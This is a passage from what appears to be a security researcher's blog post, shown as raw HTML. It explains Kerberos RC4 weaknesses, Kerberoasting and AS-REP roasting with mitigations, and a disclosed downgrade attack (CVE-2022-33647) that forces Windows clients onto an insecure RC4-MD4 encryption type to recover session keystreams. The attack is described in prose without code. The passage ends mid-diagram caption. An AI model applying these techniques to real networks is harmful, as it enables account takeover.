there's another encryption algorithm which Windows supports which is still enabled by default, </span><a href="https://en.wikipedia.org/wiki/RC4" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">RC4</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. This algorithm was used in Kerberos by Microsoft for Windows 2000, although its documentation was in draft form until </span><a href="https://datatracker.ietf.org/doc/html/rfc4757" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">RFC4757</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> was released in 2006.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The RC4 stream cipher has many substantial weaknesses, but when it was introduced it was still considered a better option than DES which has been shown to be sufficiently vulnerable to hardware cracking such as the EFF's "</span><a href="https://en.wikipedia.org/wiki/EFF_DES_cracker" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">Deep Crack</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">". Using RC4 also had the advantage that it was relatively easy to operate in a reduced key size mode to satisfy US export requirements of cryptographic systems.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">If you read the RFC for the implementation of RC4 in Kerberos, you'll notice it doesn't use the stream cipher as is. Instead it puts in place various protections to guard against common cryptographic attacks:</span></p><ul style="margin-bottom: 0px; margin-top: 0px; padding-inline-start: 48px;"><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The encrypted data is protected by a keyed MD5 HMAC hash to prevent tampering which is trivial with a simple stream cipher such as RC4. The hashed data includes a randomly generated 8-byte "confounder" so that the hash is randomized even for the same plain text.</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The key used for the encryption is derived from the hash and a base key. This, combined with the confounder makes it almost certain the same key is never reused for the encryption.</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The base key is not the user's key, but instead is derived from a MD5 HMAC keyed with the user's key over a 4 byte message type value. For example the message type is different for the AS-REQ and the AS-REP structures. This prevents an attacker using Kerberos as an encryption oracle and reusing existing encrypted data in unrelated parts of the protocol.</span></p></li></ul><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Many of the known weaknesses of RC4 are related to gathering a significant quantity of ciphertext encrypted with a known key. Due to the design of the RC4-HMAC algorithm and the general functional principles of Kerberos this is not really a significant concern. However, the biggest weakness of RC4 as defined by Microsoft for Kerberos is not so much the algorithm, but the generation of the user's key from their password.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">As already mentioned Kerberos was introduced in Windows 2000 to replace the existing NTLM authentication process used from NT 3.1. However, there was a problem of migrating existing users to the new authentication protocol. In general the KDC doesn't store a user's password, instead it stores a hashed form of that password. For NTLM this hash was generated from the Unicode password using a single pass of the MD4 algorithm. Therefore to make an easy upgrade path Microsoft specified that the RC4-HMAC Kerberos key was this same hash value.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">As the MD4 output is 16 bytes in size it wouldn't be practical to brute force the entire key. However, the hash algorithm has no protections against brute-force attacks for example no salting or multiple iterations. If an attacker has access to ciphertext encrypted using the RC4-HMAC key they can attempt to brute force the key through guessing the password. As user's will tend to choose weak or trivial passwords this increases the chance that a brute force attack would work to recover the key. And with the key the attacker can then authenticate as that user to any service they like.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">To get appropriate cipher text the attacker can make requests to the KDC and specify the encryption type they need. The most well known attack technique is called </span><a href="https://attack.mitre.org/techniques/T1558/003/" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">Kerberoasting</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. This technique requests a service ticket for the targeted user and specifies the RC4-HMAC encryption type as their preferred algorithm. If the user has an RC4 key configured then the ticket returned can be encrypted using the RC4-HMAC algorithm. As significant parts of the plain-text is known for the ticket data the attacker can try to brute force the key from that.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">This technique does require the attacker to have an account on the KDC to make the service ticket request. It also requires that the user account has a configured Service Principal Name (SPN) so that a ticket can be requested. Also modern versions of Windows Server will try to block this attack by forcing the use of AES keys which are derived from the service user's password over RC4 even if the attacker only requested RC4 support.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">An alternative form is called </span><a href="https://attack.mitre.org/techniques/T1558/004/" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">AS-REP Roasting</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. Instead of requesting a service ticket this relies on the initial authentication requests to return encrypted data. When a user sends an AS-REQ structure, the KDC can look up the user, generate the TGT and its associated session key then return that information encrypted using the user's RC4-HMAC key. At this point the KDC hasn't verified the client knows the user's key before returning the encrypted data, which allows the attacker to brute force the key without needing to have an account themselves on the KDC.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Fortunately this attack is more rare because Windows's Kerberos implementation requires pre-authentication. For a password based logon the user uses their encryption key to encrypt a timestamp value which is sent to the KDC as part of the AS-REQ. The KDC can decrypt the timestamp, check it's within a small time window and only then return the user's TGT and encrypted session key. This would prevent an attacker getting encrypted data for the brute force attack.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">However, Windows does support a user account flag, </span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"Do not require Kerberos preauthentication"</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. If this flag is enabled on a user the authentication request does not require the encrypted timestamp to be sent and the AS-REP roasting process can continue. This should be an uncommon configuration.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The success of the brute-force attack entirely depends on the password complexity. Typically service user accounts have a long, at least 25 character, randomly generated password which is all but impossible to brute force. Normal users would typically have weaker passwords, but they are less likely to have a configured SPN which would make them targets for Kerberoasting. The system administrator can also mitigate the attack by disabling RC4 entirely across the network, though this is not commonly done for compatibility reasons. A more limited alternative is to add sensitive users to the </span><a href="https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">Protected Users Group</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">, which disables RC4 for them without having to disable it across the entire network.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Windows Kerberos Encryption Implementation</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">While working on researching Windows Defender Credential Guard (CG) I wanted to understand how Windows actually implements the various Kerberos encryption schemes. The primary goal of CG at least for Kerberos is to protect the user's keys, specifically the ones derived from their password and session keys for the TGT. If I could find a way of using one of the keys with a weak encryption algorithm I hoped to be able to extract the original key removing CG's protection.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The encryption algorithms are all implemented inside the CRYPTDLL.DLL library which is separate from the core Kerberos library in KERBEROS.DLL on the client and KDCSVC.DLL on the server. This interface is undocumented but it's fairly easy to work out how to call the exported functions. For example, to get a "crypto system" from the encryption type integer you can use the following exported function:</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">NTSTATUS CDLocateCSystem(int etype, KERB_ECRYPT** engine);</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The </span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">KERB_ECRYPT</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> structure contains configuration information for the engine such as the size of the key and function pointers to convert a password to a key, generate new session keys, and perform encryption or decryption. The structure also contains a textual name so that you can get a quick idea of what algorithm is supposed to be, which lead to the following supported systems:</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Name&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Encryption Type</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">----&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ---------------</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">RSADSI RC4-HMAC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 24</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">RSADSI RC4-HMAC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 23</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Kerberos AES256-CTS-HMAC-SHA1-96&nbsp; &nbsp; &nbsp; &nbsp; 18</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Kerberos AES128-CTS-HMAC-SHA1-96&nbsp; &nbsp; &nbsp; &nbsp; 17</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Kerberos DES-CBC-MD5&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 3</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Kerberos DES-CBC-CRC&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 1</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">RSADSI RC4-MD4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -128</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Kerberos DES-Plain&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -132</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">RSADSI RC4-HMAC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -133</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">RSADSI RC4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -134</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">RSADSI RC4-HMAC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -135</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">RSADSI RC4-EXP&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -136</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">RSADSI RC4&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -140</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">RSADSI RC4-EXP&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -141</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Kerberos AES128-CTS-HMAC-SHA1-96-PLAIN&nbsp; -148</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Kerberos AES256-CTS-HMAC-SHA1-96-PLAIN&nbsp; -149</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Encryption types with positive values are well-known encryption types defined in the RFCs, whereas negative values are private types. Therefore I decided to spend my time on these private types. Most of the private types were just subtle variations on the existing well-known types, or clones with legacy numbers.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">However, one stood out as being different from the rest, "RSADSI RC4-MD4" with type value -128. This was different because the implementation was incredibly insecure, specifically it had the following properties:</span></p><br /><ul style="margin-bottom: 0px; margin-top: 0px; padding-inline-start: 48px;"><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Keys are 16 bytes in size, but only the first 8 of the key bytes are used by the encryption algorithm.</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The key is used as-is, there's no blinding so the key stream is always the same for the same user key.</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The message type is ignored, which means that the key stream is the same for different parts of the Kerberos protocol when using the same key.</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The encrypted data does not contain any cryptographic hash to protect from tampering with the ciphertext which for RC4 is basically catastrophic. Even though the name contains MD4 this is only used for deriving the key from the password, not for any message integrity.</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Generated session keys are 16 bytes in size but only contain 40 bits (5 bytes) of randomness. The remaining 11 bytes are populated with the fixed value of 0xAB.</span></p></li></ul><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">To say this is bad from a cryptographic standpoint, is an understatement. Fortunately it would be safe to assume that while this crypto system is implemented in CRYPTDLL, it wouldn't be used by Kerberos? Unfortunately not  it is totally accepted as a valid encryption type when sent in the AS-REQ to the KDC. The question then becomes how to exploit this behavior?</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Exploitation on the Wire (CVE-2022-33647)</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">My first thoughts were to attack the session key generation. If we could get the server to return the AS-REP with a RC4-MD4 session key for the TGT then any subsequent usage of that key could be captured and used to brute force the 40 bit key. At that point we could take the user's TGT which is sent in the clear and the session key and make requests as that authenticated user.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The most obvious approach to forcing the preferred encryption type to be RC4-MD4 would be to interpose the connection between a client and the KDC. The </span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">etype</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> field of the AS-REQ is not protected for password based authentication. Therefore a proxy can modify the field to only include RC4-MD4 which is then sent to the KDC. Once that's completed the proxy would need to also capture a service ticket request to get encrypted data to brute force.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Brute forcing the 40 bit key would be technically feasible at least if you built a giant lookup table, however I felt like it's not practical. I realized there's a simpler way, when a client authenticates it typically sends a request to the KDC with no pre-authentication timestamp present. As long as pre-authentication hasn't been disabled the KDC returns a Kerberos error to the client with the </span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">KDC_ERR_PREAUTH_REQUIRED</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> error code.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">As part of that error response the KDC also sends a list of acceptable encryption types in the </span><a href="https://datatracker.ietf.org/doc/html/rfc4120#section-5.2.7.5" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">PA-ETYPE-INFO2</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> pre-authentication data structure. This list contains additional information for the password to key derivation such as the salt for AES keys. The client can use this information to correctly generate the encryption key for the user. I noticed that if you sent back only a single entry indicating support for RC4-MD4 then the client would use the insecure algorithm for generating the pre-authentication timestamp. This worked even if the client didn't request RC4-MD4 in the first place.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">When the KDC received the timestamp it would validate it using the RC4-MD4 algorithm and return the AS-REP with the TGT's RC4-MD4 session key encrypted using the same key as the timestamp. Due to the already mentioned weaknesses in the RC4-MD4 algorithm the key stream used for the timestamp must be the same as used in the response to encrypt the session key. Therefore we could mount a known-plaintext attack to recover the keystream from the timestamp and use that to decrypt parts of the response.</span></p><div><br /></div><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"></span></p>

<a href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUvTW1UFAq2BkR82D8pZBtol-7uMDtXUhYYWtsdj59L02yosepSSb2zaddG7GkNt9t8YvR7pQogCoZDMv9shMSF_iq0V4pIuDCt-o042w285bolE5_s3gGXZKI-XreYKDGzT48ShCCbyijZU0dDvrpFTVl-Kk4KYX6gYokC4vjlq6GpZt9_rfBRgje/s1465/image3.png' style='display: block; padding: 1em 0; text-align: center;'><img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUvTW1UFAq2BkR82D8pZBtol-7uMDtXUhYYWtsdj59L02yosepSSb2zaddG7GkNt9t8YvR7pQogCoZDMv9shMSF_iq0V4pIuDCt-o042w285bolE5_s3gGXZKI-XreYKDGzT48ShCCbyijZU0dDvrpFTVl-Kk4KYX6gYokC4vjlq6GpZt9_rfBRgje/s600/image3.png' alt="Diagram showing the attack process. A computer with a kerberos client sends an AS-REQ to the attacker, which returns an error requesting pre-authentication and selecting RC4-MD4 encryption. The client then converts the user's password into an RC4-MD4 key which is used to encrypt the timestamp to send to the KDC. This is used to validate the user authentication and an AS-REP is returned with a TGT session key generated for RC4-MD4." title="Diagram showing the attack process. A computer with a kerberos client sends an AS-REQ to the attacker, which returns an error requesting pre-authentication and selecting RC4-MD4 encryption. The client then converts the user's password into an RC4-MD4 key which is used to 